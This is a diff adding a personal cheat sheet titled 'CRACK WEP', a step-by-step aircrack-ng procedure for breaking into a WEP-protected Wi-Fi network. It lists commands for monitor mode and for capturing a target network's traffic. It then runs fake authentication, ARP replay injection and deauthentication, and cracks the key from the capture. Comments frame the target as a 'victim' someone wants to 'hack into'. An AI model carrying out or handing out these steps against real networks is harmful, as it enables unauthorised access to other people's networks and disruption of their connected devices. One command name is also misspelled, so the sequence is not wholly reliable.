@@ -1,0 +1,31 @@
+CRACK WEP
+
+
+airmon-ng check kill #Check and kill unecessary processes
+
+airmon-ng start wlan0  #start your wireless interface into monitor mode (wlan0 might need to change)
+
+airodump-ng wlan0mon # Start monitoring on your network interface (wlan0mon might need to be changed)
+
+# Now start checking who you want to hack into.  Write down your own mac address by using ifconfig -a and writing down the "ether" address
+#Write down the channel - the ENC type IE WEP or WPA - BSSID - ESSID - ANY stations associated with the victim BSSID
+
+Channel: 6
+BSSID: F8:ED:A5:8B:85:90 
+ESSID: fart-boner
+AP MAC: F8:ED:A5:8B:85:90 
+Stations associated (MAC):
+Your NIC's MAC: 00:c0:ca:5a:05:b7
+
+airomon-ng start wlan0mon 6 (the number 6 reflects the channel you are hacking on)
+
+airodump-ng -c 6 --bssid F8:ED:A5:8B:85:90 -w /root/Desktop/new-test wlan0mon  
+
+aireplay-ng -1 0 -e fart-boner -a F8:ED:A5:8B:85:90 -h 00:c0:ca:5a:05:b7 wlan0mon
+
+aireplay-ng -3 -b F8:ED:A5:8B:85:90 -h 00:c0:ca:5a:05:b7 wlan0mon
+
+aireplay-ng -0 1 -a F8:ED:A5:8B:85:90 -c 00:c0:ca:5a:05:b7 wlan0mon
+
+aircrack-ng /root/Desktop/new-test-01.cap
+
